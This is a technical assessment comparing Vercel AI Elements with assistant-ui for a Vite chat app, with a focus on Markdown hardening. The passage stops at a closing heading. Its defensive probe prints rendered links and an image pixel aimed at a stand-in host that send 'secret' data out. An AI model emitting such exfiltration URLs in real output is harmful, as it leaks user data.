# Can Vercel AI Elements replace assistant-ui as mymemo-web's chat UI layer? — 2026-09 assessment

**Research date: 2026-09-07.** Every substantive claim below was verified against a primary
source on that date: the `vercel/ai-elements` repository at commit
[`6a9d5b1`](https://github.com/vercel/ai-elements/commit/6a9d5b1822ffb10bba4bd97175f01edd7d8651cd)
(2026-08-21, `main`), the `vercel/streamdown` repository at commit
[`e0ce123`](https://github.com/vercel/streamdown/commit/e0ce123f493e2a7eb6d304be62ca0040ab8c3881)
(2026-09-01, `main`), the live shadcn registry at `https://elements.ai-sdk.dev/api/registry/`,
the npm registry, and published package tarballs. Component **source** is treated as the
authority wherever docs prose is vague or stale — and in one load-bearing case (§4) the docs
*are* stale. Where a claim could not be traced to a primary source it is flagged in
[Open unknowns](#open-unknowns).

Judging frame: **mymemo-web is a Vite + React app, not Next.js**; its prototype drives
`useChat` + `DefaultChatTransport` against the `apps/agent-front` relay, which already emits
two custom AI SDK data parts — `data-generative-ui` (an ADR-0017 catalog payload) and
`data-artifacts` (see `apps/agent-front/src/text-stream.ts`). And
[ADR-0017](../adr/0017-emit-display-only-generative-ui-as-catalog-payloads.md) is normative:
"**Renderers MUST NOT linkify or execute any construct beyond strong/em**", with no URL-bearing
prop anywhere in the catalog because "a `src` is a fetch/phishing/exfiltration channel".

---

## Short answer

- **AI Elements is not a library you depend on — it is a shadcn registry that copies TSX into
  your repo.** The only npm package named `ai-elements` (v1.9.0, Apache-2.0) is a **58-line CLI**
  that shells out to `npx shadcn@latest add <registry-url>`. The components themselves are never
  published to npm. You own the source after install.
- **Next.js is a documented prerequisite but not a code-level one.** The docs demand
  "Next.js 14+ (App Router recommended)", yet **zero of the 49 component files import anything
  from `next/*`**. The CLI performs no framework detection. shadcn/ui officially supports Vite.
  Adoption in a Vite app is plausible; it is unblessed, so any breakage is yours.
- **There is no `parts` extension point at all.** `Message` takes a `from` role and children;
  nothing in AI Elements iterates a `UIMessage.parts` array to dispatch on part type. Every
  first-party example makes the **app** write `parts.map(...)` + `switch (part.type)`. There is
  **no registry, no allowlist, no `data-*` example anywhere in the repo** — verified absence.
  This is strictly less than assistant-ui's `MessagePrimitive.GenerativeUI` + component registry,
  which ADR-0017's renderer guidance currently names.
- **Markdown is [Streamdown](https://streamdown.ai) (Vercel's own react-markdown replacement),
  not react-markdown.** Out of the box it **linkifies bare URLs** (remark-gfm autolink literals),
  renders `[text](url)`, and renders `![](url)` as a real `<img src>` that fetches on render.
  `rehype-harden` is already in the pipeline but configured wide open:
  `allowedLinkPrefixes: ["*"]`, `allowedImagePrefixes: ["*"]`, `allowDataImages: true`.
  **Same regression class as assistant-ui — but with a first-class, first-party-documented fix.**
- **The fix is a config change, not a fork.** Streamdown exports `defaultRehypePlugins` and its
  `rehypePlugins` prop *replaces* the default array; re-declaring `harden` with empty prefix
  lists and `linkBlockPolicy: "text-only"` / `imageBlockPolicy: "remove"` renders links as inert
  text and drops images entirely. Verified by running the real pipeline (§4). Because
  `message.tsx` lives in your repo, you can bake this in at the single call site — an npm-only
  component library would force a wrapper or a fork.
- **Transport is a non-issue.** `@ai-sdk/react` is a **devDependency** of the components package
  and appears in **no component source file**. The only runtime coupling is *type-only* imports
  from `ai` (`UIMessage`, `ToolUIPart`, `ChatStatus`, …). Components take plain props;
  `useChat` / `DefaultChatTransport` appear only in doc examples, never in a component.
- **The coverage gap versus assistant-ui is a runtime, not a widget set.** AI Elements ships no
  thread list, no persistence/history adapter, no branch *data model* (only branch chrome you
  wire yourself — the docs say so explicitly), no edit-and-resubmit, and a thin accessibility
  layer (17 `aria-*` occurrences across ~12.7k lines; `role="log"` on the transcript; the rest
  inherited from Radix via shadcn/ui).

---

## 1. What AI Elements is today

**Packages.** One published package: [`ai-elements`](https://www.npmjs.com/package/ai-elements),
**`1.9.0`**, published **2026-03-12**, Apache-2.0, author Hayden Bleasel (`@vercel.com`),
homepage `https://elements.ai-sdk.dev`, repo `vercel/ai-elements` directory `packages/cli`.
Its `files` array is `["index.js", "README.md", "LICENSE"]` — **8,568 bytes unpacked, 4 files**.
It is a CLI and nothing else. The component workspace (`packages/elements`) is
`"name": "@repo/elements", "version": "0.0.0", "private": true` — **never published**.

**Install model: shadcn-style copy-in, plus real runtime deps.** The entire CLI is 58 lines; its
operative part is:

```js
const fullCommand = `${commandPrefix} shadcn@latest add ${targetUrls}`;
```
— `packages/cli/index.js`, where `targetUrls` are `https://elements.ai-sdk.dev/api/registry/<name>.json`.

Fetching `https://elements.ai-sdk.dev/api/registry/message.json` returns a
`https://ui.shadcn.com/schema/registry-item.json` item whose single file has
`target: "components/ai-elements/message.tsx"` (8,572 bytes of TSX), plus:

```
dependencies         = ['@streamdown/cjk', '@streamdown/code', '@streamdown/math',
                        '@streamdown/mermaid', 'ai', 'lucide-react', 'streamdown']
registryDependencies = ['button', 'button-group', 'tooltip']
```

So it is **both**: the *component* source is copied into your tree (you own and can edit it —
the docs say "the code lives in your project, you can even open the component file … or make
custom modifications", `apps/docs/content/docs/usage.mdx`), while `streamdown`, `ai`,
`lucide-react` and the `@streamdown/*` plugins remain ordinary `node_modules` dependencies.
That distinction matters in §4. Re-running the CLI "will ask before overwriting the file so you
can save any custom changes you made" (`usage.mdx`).

**License.** Apache-2.0 — `packages/cli/package.json` `"license": "Apache-2.0"` and the repo
`LICENSE` (short-form Apache notice, "Copyright 2023 Vercel, Inc."). The GitHub API reports
`NOASSERTION` for both `vercel/ai-elements` and `vercel/streamdown` because the LICENSE file is
the short notice rather than the full text; the declared license is unambiguous.

**Stability signals.** Repo created 2025-08-15; 2,409 stars; 95 open issues; last push
2026-09-01. npm downloads last week (2026-08-31 → 09-06): **86,878**. The CLI version line is
slow (1.9.0 in March) because **the CLI is not the product** — the registry is, and it deploys
continuously. Observable drift: the live registry served **48** `registry:component` items while
`main` contains **49** component files; `question` (added 2026-08-21, PR #479) was absent from
the live registry on 2026-09-07. There is **no stated stability policy, no semver contract for
component APIs, and no changelog for registry contents** — inherent to copy-in distribution: an
"upgrade" is a diff you review, and breaking changes cost you nothing until you re-run the CLI.

**Framework requirements — the decisive question.** The docs are explicit and Next-shaped:

> - **Node.js** 18 or later
> - **React** 19
> - **Next.js** 14+ (App Router recommended)
> - **AI SDK** installed and configured
> - **shadcn/ui** initialized in your project
> - **Tailwind CSS** 4
>
> — `apps/docs/content/docs/setup.mdx`

But the source says otherwise. `grep -rn "from \"next/" packages/elements/src/` returns
**nothing** across all 49 files. 41 of the 49 carry a `"use client"` directive, which is inert
outside an RSC bundler. The CLI does no framework detection whatsoever (full source above).
shadcn/ui itself officially supports Vite — its
[Vite installation page](https://ui.shadcn.com/docs/installation/vite) opens "Install and
configure shadcn/ui for Vite" and walks through `@tailwindcss/vite`, the `@/*` tsconfig alias,
and `shadcn@latest init`. So the real requirements are **React 19, Tailwind CSS 4, shadcn/ui
initialised with CSS-Variables mode, and an `@/*` path alias** — all satisfiable in Vite.

Two concrete Vite-side chores the docs do not cover: (a) `message.mdx` requires adding
`@source "../node_modules/streamdown/dist/*.js";` to `globals.css` so Tailwind 4 scans
Streamdown's classes, and (b) `"use client"` directives in dependency-free source produce
Rollup "Module level directives cause errors when bundled" warnings under Vite unless silenced.
Neither is a blocker.

**shadcn/ui assumed?** Yes, hard. Components import `@repo/shadcn-ui/components/ui/{button,
tooltip,collapsible,badge,…}` (rewritten to `@/components/ui/*` by the registry), and
`registryDependencies` pull those primitives in. "If you don't have shadcn/ui installed, running
any AI Elements install command will automatically set it up for you" (`setup.mdx`). Theming is
shadcn CSS variables; the README notes "AI Elements supports CSS Variables mode only".

## 2. Component inventory

49 components on `main` (48 currently in the live registry). Grouped as the docs group them,
with each component's own first-party description:

**Chatbot (19).**
`message` — message rendering, branching chrome, actions, and the Markdown response ·
`conversation` — wraps messages, auto-scrolls to bottom, scroll-to-bottom button ·
`prompt-input` — textarea + file upload + submit + model dropdown (1,463 lines, the largest) ·
`attachments` — displays files, images, video, audio and source documents ·
`tool` — collapsible tool-invocation details ·
`confirmation` — tool approval request/accept/reject ·
`reasoning` — collapsible reasoning that opens while streaming ·
`chain-of-thought` — reasoning steps with search results and progress ·
`plan` — collapsible AI execution plan with streaming ·
`task` — collapsible task list with status indicators ·
`queue` — message lists, todos, collapsible task sections ·
`sources` — the sources/citations behind a response ·
`inline-citation` — hoverable inline citation with source and quote ·
`context` — context-window usage, token consumption, cost estimation ·
`model-selector` — searchable command palette for model choice ·
`suggestion` — horizontal row of clickable suggestions ·
`question` — prompt collecting choices, freeform text, or both ·
`checkpoint` — marks a history point and restores chat to a previous state ·
`shimmer` — animated shimmer for loading/progressive reveal.

**Code / agent-workspace (15).**
`code-block` (Shiki syntax highlighting, line numbers, copy) · `snippet` (inline code) ·
`terminal` (streaming console output with ANSI colour) · `file-tree` · `commit` ·
`package-info` · `environment-variables` (masking + copy) · `stack-trace` ·
`test-results` · `schema-display` (REST endpoint docs) · `agent` (model/instructions/tools/
output schema) · `artifact` (container for generated content) · `sandbox` (collapsible generated
code + output) · `web-preview` · `jsx-preview` (renders JSX **strings** with streaming — see §3).

**Voice (6).** `audio-player` (media-chrome) · `speech-input` · `transcription` (click-to-seek) ·
`mic-selector` · `voice-selector` · `persona` (Rive-animated listening/thinking/speaking).

**Workflow / canvas (7).** `canvas`, `node`, `edge`, `connection`, `controls`, `panel`,
`toolbar` — all React Flow (`@xyflow/react`) wrappers.

**Utilities (2).** `image` (renders an AI SDK `Experimental_GeneratedImage`) ·
`open-in-chat` (dropdown to reopen a query in ChatGPT/Claude/T3/Scira/v0).

Plus 88 `registry:block` example implementations, installable as working starting points.

## 3. How it renders message parts — and the custom-data-part extension point

**It doesn't. The app does.** This is the single most important structural finding.

`Message` is a styled `div` that takes a role, not a message:

```tsx
export type MessageProps = HTMLAttributes<HTMLDivElement> & {
  from: UIMessage["role"];
};

export const Message = ({ className, from, ...props }: MessageProps) => (
  <div
    className={cn(
      "group flex w-full max-w-[95%] flex-col gap-2",
      from === "user" ? "is-user ml-auto justify-end" : "is-assistant",
      className
    )}
    {...props}
  />
);
```
— `packages/elements/src/message.tsx`

`UIMessage` is imported `import type`, purely to name the `role` union. Across all 49 component
files, `.parts` is referenced exactly **twice**, and neither is a dispatcher: `conversation.tsx`
concatenates `text` parts into a string for the "download transcript as Markdown" button, and
`queue.tsx` declares its own unrelated `QueueMessagePart` type.

The pattern the first-party docs teach is an app-owned switch:

```tsx
{messages.map(({ role, parts }, index) => (
  <Message from={role} key={index}>
    <MessageContent>
      {parts.map((part, i) => {
        switch (part.type) {
          case "text":
            return (
              <MessageResponse key={`${role}-${i}`}>
                {part.text}
              </MessageResponse>
            );
        }
      })}
    </MessageContent>
  </Message>
))}
```
— `apps/docs/content/docs/usage.mdx`

Every other example is the same shape with a different predicate:
`part.type === "tool-fetch_weather_data"` (`tool.mdx`), `part.type === "source-url"`
(`sources.mdx`), `part.type === "reasoning"` (`reasoning.mdx`),
`part.type === "tool-delete_file"` (`confirmation.mdx`). `message.mdx` uses
`switch (part.type) { case "text": … default: return null; }`.

**Custom `data-*` parts.** Searched across component source, all 88 registry blocks, and every
docs page: **no `data-*` part is handled, demonstrated, or mentioned anywhere in the AI Elements
repository** (verified absence, not inference). Rendering `data-generative-ui` means writing
your own `case "data-generative-ui": return <GenerativeUi payload={part.data.payload} />` in the
same switch — exactly what you would write with no UI library at all.

**Is there anything comparable to `MessagePrimitive.GenerativeUI` + registry?** No. There is
neither a component allowlist nor an unknown-name fallback anywhere in the codebase
(`grep -i "allowlist\|registry of components\|componentRegistry"` over `packages/elements/src`
and the docs: no hits).

The nearest analogue is **`jsx-preview`**, and it is a different and more dangerous thing: it
renders a *model-authored JSX string* through `react-jsx-parser`.

```tsx
<JsxParser
  bindings={bindings}
  components={components}
  jsx={displayJsx}
  onError={handleError}
  renderInWrapper={false}
/>
```
— `packages/elements/src/jsx-preview.tsx`

Note what is *not* passed. `react-jsx-parser@2.2.0`'s defaults (verified in the published
tarball, `dist/react-jsx-parser.min.js` and its README) are `allowUnknownElements: true`,
`blacklistedTags: ["script"]`, `blacklistedAttrs: [/^on.+/i]`. So unknown tags fall through to
real DOM elements — including `<a href>` and `<img src>`. The library exposes a
`componentsOnly` prop that would restrict rendering to the `components` map; AI Elements does
not set it. `jsx-preview` is therefore **not** an ADR-0017-compatible catalog renderer, and for
mymemo it is a component to *not* install rather than one to build on.

**Bottom line for question 3:** AI Elements offers presentation for parts you have already
identified. ADR-0017's registry — five names, props validated server-side, framed fallback on an
unknown name — is app code either way. What AI Elements removes relative to assistant-ui is a
*shipped, documented* place to hang it.

## 4. Markdown rendering — the hard constraint

**The renderer is [Streamdown](https://streamdown.ai), not react-markdown.** `MessageResponse`
(the component the docs put every assistant token through) is a memoised wrapper:

```tsx
export type MessageResponseProps = ComponentProps<typeof Streamdown>;

const streamdownPlugins = { cjk, code, math, mermaid };

export const MessageResponse = memo(
  ({ className, ...props }: MessageResponseProps) => (
    <Streamdown
      className={cn(
        "size-full [&>*:first-child]:mt-0 [&>*:last-child]:mb-0",
        className
      )}
      plugins={streamdownPlugins}
      {...props}
    />
  ),
  (prevProps, nextProps) =>
    prevProps.children === nextProps.children &&
    nextProps.isAnimating === prevProps.isAnimating
);
```
— `packages/elements/src/message.tsx`

`streamdown` is described on npm as "A drop-in replacement for react-markdown, designed for
AI-powered streaming" (`packages/streamdown/package.json`), Apache-2.0, **v2.6.0** on `main`,
`^2.4.0` in the AI Elements manifest, ~4.38M weekly downloads. Its own dependencies include
`remark-gfm`, `rehype-raw`, `rehype-sanitize` and `rehype-harden`.

### (a) and (b): yes, and yes, by default

Streamdown's shipped defaults, verbatim:

```tsx
export const defaultRehypePlugins: Record<string, Pluggable> = {
  raw: rehypeRaw,
  sanitize: [rehypeSanitize, defaultSanitizeSchema],
  harden: [
    harden,
    {
      allowedImagePrefixes: ["*"],
      allowedLinkPrefixes: ["*"],
      allowedProtocols: ["*"],
      defaultOrigin: undefined,
      allowDataImages: true,
    },
  ],
} as const;

export const defaultRemarkPlugins: Record<string, Pluggable> = {
  gfm: [remarkGfm, {}],
  codeMeta: remarkCodeMeta,
} as const;
```
— `packages/streamdown/index.tsx`

Streamdown's own docs state it plainly:

> By default, Streamdown is configured with **permissive security** to allow maximum
> functionality … This works well for trusted content but should be tightened for untrusted
> sources.
>
> — `apps/website/content/docs/security.mdx` (vercel/streamdown)

`message.tsx` overrides none of it. To confirm behaviour rather than infer it, I reconstructed
Streamdown 2.6.0's exact plugin chain (`remark-parse` → `remark-gfm` → `remark-rehype` →
`rehype-raw` → `rehype-sanitize` with Streamdown's schema → `rehype-harden` with the defaults
above) and rendered adversarial Markdown. Output with the **shipped defaults**:

```html
<p>Bare URL: <a href="https://evil.example/steal?d=secret" target="_blank" rel="noopener noreferrer">https://evil.example/steal?d=secret</a></p>
<p>Bare www: <a href="http://www.evil.example/x" target="_blank" rel="noopener noreferrer">www.evil.example/x</a></p>
<p>Explicit link: <a href="https://evil.example/phish" target="_blank" rel="noopener noreferrer">click me</a></p>
<p>Image: <img src="https://evil.example/pixel.gif?d=secret" alt="alt"></p>
<p>JS link: <span title="Blocked URL: undefined" class="text-gray-500">x [blocked]</span></p>
```

So: **bare URLs are linkified** (remark-gfm autolink literals — the same mechanism recorded
against assistant-ui), `[text](url)` becomes a live anchor, and `![](url)` becomes a real
`<img src>` that issues the request **on render, with no user interaction**. `javascript:` is
already blocked by harden regardless of configuration.

Two nuances the HTML above does not show, both from the React layer:

1. **Links are intercepted by a confirmation modal, by default.** `linkSafety` defaults to
   `{ enabled: true }` (`index.tsx`), and when enabled the anchor is replaced by a `<button>`
   that opens a modal showing the full URL before `window.open`:

   ```tsx
   if (linkSafety?.enabled && href) {
     return (
       <>
         <button … onClick={handleClick} type="button">{children}</button>
         {linkSafety.renderModal ? linkSafety.renderModal(modalProps) : <LinkSafetyModal {...modalProps} />}
       </>
     );
   }
   ```
   — `packages/streamdown/lib/components.tsx`

   Streamdown documents this as "a confirmation modal before opening external links, similar to
   ChatGPT's implementation" (`apps/website/content/docs/link-safety.mdx`). It is a real
   mitigation, and it is **not** ADR-0017 compliance: a model-authored link is still present,
   still styled as a link, still clickable, and still navigates on confirm.

2. **Images get no such interstitial.** `lib/image.tsx` renders `<img src={src} …>` directly
   (with a hover download button). This is the sharper hole: an image URL exfiltrates on render.

### Can it be disabled or replaced? Yes — three independent levers, all first-party

**Lever 1 — reconfigure `rehype-harden` (recommended).** `rehypePlugins` is a plain prop whose
default is the array above, and Streamdown **exports** `defaultRehypePlugins` so you can keep
`raw` + `sanitize` and swap only `harden`. Streamdown's docs are explicit about the semantics:

> When overriding `rehypePlugins`, always include `defaultRehypePlugins.sanitize` to preserve
> XSS protection. The `rehypePlugins` prop **replaces** the entire default array — it does not
> merge.
>
> — `apps/website/content/docs/security.mdx` (vercel/streamdown)

`rehype-harden` (Vercel Labs, MIT, `vercel-labs/markdown-sanitizers`) is purpose-built for this
threat model — "particularly important for markdown returned from LLMs in AI agents which might
have been subject to prompt injection" (its README) — and its documented defaults are
`allowedLinkPrefixes: []` / `allowedImagePrefixes: []`, i.e. **block everything**. It also
exposes `linkBlockPolicy` and `imageBlockPolicy` with values `"indicator"` (default),
`"text-only"`, `"remove"`. Re-running the same probe with
`{ allowedLinkPrefixes: [], allowedImagePrefixes: [], linkBlockPolicy: "text-only", imageBlockPolicy: "remove" }`:

```html
<p>Bare URL: <span>https://evil.example/steal?d=secret</span></p>
<p>Bare www: <span>www.evil.example/x</span></p>
<p>Explicit link: <span>click me</span></p>
<p>Image: </p>
<p>Data image: </p>
<p>JS link: <span>x</span></p>
```

That is exactly ADR-0017's stated requirement — "such syntax renders as literal text" — reached
with a config object, no fork, no patched dependency. Note it satisfies the *rule*, not the
ADR's *mechanism*: ADR-0017 specifies an emphasis-only renderer with no link/image constructs at
all ("enforced by renderer capability, not linting"), whereas this is a full CommonMark+GFM
renderer whose link/image output is neutralised downstream. Defence-in-depth-wise those are not
identical; whether the difference matters is a decision, not a finding.

**Lever 2 — override the `a`/`img` components.** Streamdown merges a user `components` map over
its defaults (`const merged = { ...defaultComponents, ...userComponents };`, `index.tsx`), so
`components={{ a: ({children}) => <>{children}</>, img: () => null }}` replaces rendering
outright. Useful as belt-and-braces; on its own it leaves the `href`/`src` in the hast tree.

**Lever 3 — edit the copied-in source.** Because `message.tsx` is *your file*, levers 1 and 2 can
be baked into `MessageResponse` at its single definition, so no call site can forget them and no
future `<MessageResponse>` added by a teammate is unhardened. **This is the concrete advantage of
the copy-in model over an npm dependency**: with a published component library you would have to
wrap it (leaky — anyone can import the raw one), fork it, or patch it. Here you edit one file you
already own, and the CLI prompts before overwriting it on upgrade. Note the ceiling honestly:
`streamdown` itself is still a normal `node_modules` dependency — you can reconfigure and
override its renderers, you cannot delete its anchor and image code, and its upgrades are yours
to re-audit.

**One gotcha in `MessageResponse` as shipped.** Its memo comparator inspects only `children` and
`isAnimating`. Any hardening you pass as a *prop* is read at first render and then ignored on
re-render, so it must be a module-level constant (which it should be anyway). Baking the config
into the component body — lever 3 — sidesteps this entirely.

**A docs discrepancy worth knowing.** AI Elements' `message.mdx` prop table still documents
`allowedImagePrefixes` (default `["*"]`), `allowedLinkPrefixes` (default `["*"]`) and
`defaultOrigin` as **top-level `<MessageResponse />` props**, and claims the default remark
plugins are `[remarkGfm, remarkMath]` with rehype `[rehypeKatex]`. None of that matches Streamdown
2.x: those three options moved inside the `harden` rehype-plugin config, and math is now a
`plugins` entry. Verified against the published `streamdown@2.4.0` type declarations (the version
AI Elements pins): `dist/index.d.ts` exports `defaultRehypePlugins` and `LinkSafetyConfig`, and
contains **no** `allowedLinkPrefixes` / `allowedImagePrefixes` on `StreamdownProps`. Setting those
props as documented would silently do nothing. **Trust the source, not the prop table.**

## 5. Transport assumptions

**No `useChat` requirement, and no transport coupling at all.**

- `@ai-sdk/react` is listed under **`devDependencies`** in `packages/elements/package.json`
  (`^3.0.41`) — used for the docs site and tests. `grep -rn "useChat\|ChatTransport\|@ai-sdk/react" packages/elements/src/`
  returns **zero hits**.
- The only runtime touchpoints with the AI SDK are **type-only** imports from `ai`:
  `UIMessage` (`message.tsx`, `conversation.tsx`), `ToolUIPart` / `DynamicToolUIPart`
  (`tool.tsx`, `confirmation.tsx`, `sandbox.tsx`), `FileUIPart` / `SourceDocumentUIPart`
  (`attachments.tsx`, `prompt-input.tsx`), `ChatStatus` (`prompt-input.tsx`),
  `LanguageModelUsage` (`context.tsx`), `Tool` (`agent.tsx`), and the experimental
  speech/transcription/image result types. Types erase at build; nothing imports `ai` at runtime
  except through those files' other deps.
- `DefaultChatTransport` appears **only in documentation examples** (`vercel-ai-frontend.mdx`,
  `tool.mdx`, `confirmation.mdx`, `sources.mdx`), always as app-side wiring:
  `useChat({ transport: new DefaultChatTransport({ api: "/api/chat" }) })`. No component reads it.

Components accept plain props throughout: `<Message from={role}>`, `<MessageResponse>{string}</MessageResponse>`,
`<ToolHeader type state />`, `<PromptInputSubmit status={status} />`, `<ConversationDownload messages={UIMessage[]} />`.
The docs frame this as deliberate — "you can swap any layer independently. Use a different model
provider, build custom hooks, or create your own components" (`vercel-ai-frontend.mdx`).

**For mymemo-web:** `useChat` + `DefaultChatTransport` against the `agent-front` relay works
unchanged, and so would a custom `ChatTransport`, a plain `UIMessage[]` from your own store, or
no AI SDK at all. The one real constraint is *shape*: the components are typed against AI SDK v6
`UIMessage` / part unions (`packages/elements/package.json` depends on `ai: ^6.0.105`), so a
different message model means casting or diverging types.

## 6. Coverage gaps versus assistant-ui

assistant-ui facts below were verified the same day against
[`assistant-ui/assistant-ui`](https://github.com/assistant-ui/assistant-ui) at commit
`f9f3f0afddb92faceeb4227c430a69f730165703` (2026-09-07), the npm registry, and published
tarballs.

**They are not the same kind of thing.** assistant-ui is a **runtime + unstyled primitives**
(`@assistant-ui/react` **0.15.18**, MIT, published 2026-09-03, peer `react: ^18 || ^19`, runtime
deps including `zustand` and `radix-ui`), with a *separate* styled "Elements" layer distributed
through its own shadcn registry (`https://r.assistant-ui.com/thread.json`). AI Elements is
**only** the styled layer, with no runtime at all. It exports 49 styled components; assistant-ui
exports 17 primitive namespaces (`ThreadPrimitive`, `MessagePrimitive`, `ComposerPrimitive`,
`ThreadListPrimitive`, `BranchPickerPrimitive`, `AttachmentPrimitive`, `ActionBarPrimitive`,
`MessagePartPrimitive`, …) plus a runtime layer of adapters and stores. Its docs put it plainly:

> Primitives are the unstyled layer of assistant-ui: accessible React components that handle all
> the wiring of AI chat … and leave every visual decision to you.
>
> — `apps/docs/content/docs/primitives/index.mdx` (assistant-ui)

Neither requires Next.js: assistant-ui ships first-class Vite examples (`examples/with-react-router`,
`examples/with-tanstack`, both on `vite ^8.2.2` with no `next` dependency), though its CLI is
Next-centric ("Adding assistant-ui to an existing Next.js project", `docs/(getting-started)/cli.mdx`).

### Not shipped — you build it yourself

| Capability | assistant-ui | AI Elements |
|---|---|---|
| **Thread list / multi-thread** | `ThreadListPrimitive`, `ThreadListItemPrimitive`, `ThreadListItemMorePrimitive`; `ThreadListRuntime`, `RemoteThreadList`, `InMemoryThreadList`; `RemoteThreadListAdapter` with `list/rename/archive/unarchive/delete/generateTitle/fetch` | **Nothing.** No thread, history, sidebar or list component in the registry (48 items checked by name) |
| **Persistence / history hydration** | `ThreadHistoryAdapter` (`load()/append()/update?()/delete?()/pin?()`), `MessageFormatAdapter` (`encode`/`decode`/`getId`) so you own the wire format, `ExportedMessageRepository`, `AssistantRuntimeProvider` | **Nothing.** No adapter, no provider, no concept of a stored thread |
| **Attachments** | `AttachmentAdapter { accept, add, remove, send }` with `SimpleImageAttachmentAdapter`, `SimpleTextAttachmentAdapter`, `CompositeAttachmentAdapter`, `CloudFileAttachmentAdapter`, `vercelAttachmentAdapter` | **Partially shipped, no adapter.** `PromptInput` does file picking, drag-and-drop, paste, screenshot capture, `accept`/`maxFiles`/`maxFileSize` with typed error codes, and `attachments` renders previews — but files become blob URLs converted to **data URLs on submit** (`prompt-input.tsx`), inline in the `FileUIPart`. There is no upload/storage seam |
| **Message branching** | Real data model: `switchToBranch(branchId)`, thread state `{ branchNumber, branchCount }`, `ExternalStoreBranchChange`, `ExternalThreadBranchAdapter`, `unstable_onBranchChange`, plus `BranchPickerPrimitive` | **Chrome only.** `MessageBranch*` in `message.tsx` is `useState` over a `ReactElement[]` of children you pass. The docs say so: "Branching is an advanced use case you can implement to suit your needs. While the AI SDK does not provide built-in branching support, you have full flexibility to design and manage multiple response paths" (`message.mdx`) |
| **Message editing** | `ActionBarPrimitive.Edit`, `EditComposerRuntime`/`EditComposerState`, `beginEdit()` on the message runtime and `beginEdit(messageId)` on the thread; docs guide | **Nothing.** `MessageAction` is a styled icon button with a tooltip; every behaviour is your `onClick` |
| **Part dispatch / generative UI** | `MessagePrimitive.GenerativeUI` with a `GenerativeUIComponentRegistry` allowlist (§3) | **Nothing** (see §3) |

None of these is *actively unsupported* in AI Elements — nothing fights you. They are simply
absent, and every one of them is runtime/state work rather than markup: the reason AI Elements
does not ship them is that it deliberately has no runtime to hang them on.

### Where AI Elements is ahead

- **Breadth of finished widgets.** 49 components against assistant-ui's ~15 styled Elements:
  Shiki code blocks, ANSI terminal, file tree, stack trace, test results, commit view, schema
  display, React Flow canvas set, the whole voice family (media-chrome player, Rive persona,
  device selectors, transcription), context/token-cost meter, model palette.
- **Markdown hardening is present in the default stack.** assistant-ui's copy-in
  `markdown-text.tsx` runs `react-markdown ^10.1.0` + `remark-gfm` with **no `rehype-harden`, no
  `rehype-sanitize`, no `img` override at all** (its `components` map covers `h1`–`h6`, `p`, `a`,
  `blockquote`, lists, tables, `strong`, `sup`, `pre`, `code` — no `img`), and its `a` renderer
  is styling-only with no `rel`/`target` hardening. Its only URL defence is react-markdown's
  built-in `defaultUrlTransform` (`const safeProtocol = /^(https?|ircs?|mailto|xmpp)$/i`, verified
  in the `react-markdown@10` tarball) — `javascript:` is stripped, arbitrary remote `http(s)` link
  and image URLs are not. AI Elements' Streamdown stack ships `rehype-sanitize` **and**
  `rehype-harden` **and** a link-confirmation modal in the box; all three are misconfigured for
  ADR-0017, but they exist and are documented (§4). assistant-ui offers the same stack only as an
  opt-in swap, `@assistant-ui/react-streamdown@0.3.13`.
- **Test coverage of the widgets.** 47 browser-mode Vitest/Playwright test files for 49
  components (`packages/elements/__tests__/`).

### Accessibility — a wash, with different holes

Neither is strong, and both delegate most semantics to Radix.

| | assistant-ui | AI Elements |
|---|---|---|
| `aria-*` occurrences | ~50 across 14 files in `packages/react/src`; **zero** in `packages/core/src/react/primitives` | 17 across ~12.7k lines in `packages/elements/src` |
| Live region for streaming output | **None** — no `aria-live`, no `aria-atomic`, no `role="log"` anywhere in `packages/react/src` or `packages/core/src` | `role="log"` on `Conversation` (`conversation.tsx`) — the transcript is announced |
| `role=` literals | `option`×2, `group`×2, `slider`, `menu`, `listbox`, `alert` | `img`×4, `group`×3, `treeitem`×2, `tree`, `log` |
| Keyboard handling | 5 primitive files; a Radix roving-focus group for the thread list with its own test | 5 component files (`file-tree`, `stack-trace`, `commit`, `prompt-input`, `web-preview`) |
| First-party a11y statement | One short section, honest: "The thread list leans on native button semantics and Radix's `DropdownMenu`; the arrow-key navigation is layered on top as a convenience, not a requirement" (`docs/primitives/thread-list.mdx`) | Marketing prose only: "Every component follows accessibility best practices: Semantic HTML elements, Proper ARIA attributes, Keyboard navigation, Screen reader support…" (`docs/philosophy.mdx`) — no audit, no a11y test, no a11y reference page |

Notably AI Elements has the live region assistant-ui lacks, and assistant-ui has the focus
management AI Elements lacks. Neither ships an accessibility conformance claim you could rely on.

### Theming philosophy

Effectively identical: both are Tailwind + shadcn CSS-variable tokens delivered through a shadcn
registry, and both keep the styled layer in your repo. The difference is what sits *underneath* —
assistant-ui's primitives emit `data-*` attributes and no classes, so its styled layer is a
replaceable skin over a runtime; AI Elements' styled layer *is* the product, with `cn()` and
Tailwind classes baked into every file you copy. Restyling AI Elements means editing the copied
components; restyling assistant-ui means writing new components against unchanged primitives.

### The one item ADR-0017 depends on

ADR-0017's renderer guidance is written against a specific assistant-ui API, and that API is real
and current:

```ts
export namespace MessagePrimitiveGenerativeUI {
  export type Props = {
    components: GenerativeUIComponentRegistry;   // the allowlist
    spec?: GenerativeUISpec | undefined;
    Fallback?: ComponentType<{ component: string; props?: unknown }> | undefined;
  };
}
```
— `packages/core/src/react/primitives/generativeUI/GenerativeUI.tsx` (assistant-ui)

with the unknown-name behaviour the ADR requires:

```tsx
const Resolved = components[component];
if (!Resolved) {
  if (Fallback) {
    return <Fallback key={key ?? path} component={component} props={props} />;
  }
  throw new GenerativeUIRenderError(component);
}
```

and a spec shape (`GenerativeUINode = string | { component, props?, children?, key? }`,
`GenerativeUISpec = { root: … }`) that matches `@mymemo/ui-catalog`'s `UiNode` and the
`data-generative-ui` payload `agent-front` already emits. Its first-party security note is still
present verbatim, but **has moved** — it is now at
[`/docs/tools/generative-ui-primitive#security`](https://www.assistant-ui.com/docs/tools/generative-ui-primitive),
not `/docs/tools/generative-ui` (that URL now documents a different, incompatible `present`-tool
path with a flat `{ $type, ...props }` wire form that returns `null` on an unknown name instead of
throwing). The note reads:

> It does **not** constrain the `props` the agent supplies. Spec props are spread directly onto
> your allowlisted components, so treat every allowlisted component as receiving untrusted input:
> never forward agent-supplied props into `dangerouslySetInnerHTML`, validate or reject `href` and
> `src` values (for example block `javascript:` URLs), and avoid passing spec props anywhere they
> become executable. The safest allowlisted components accept only primitive, display-oriented
> props.

Worth noting for its own sake: ADR-0017's link to that guidance is stale and should be repointed
whoever touches it next.

## What this means for mymemo-web

Evidence, not a decision.

**What adopting AI Elements would cost.**

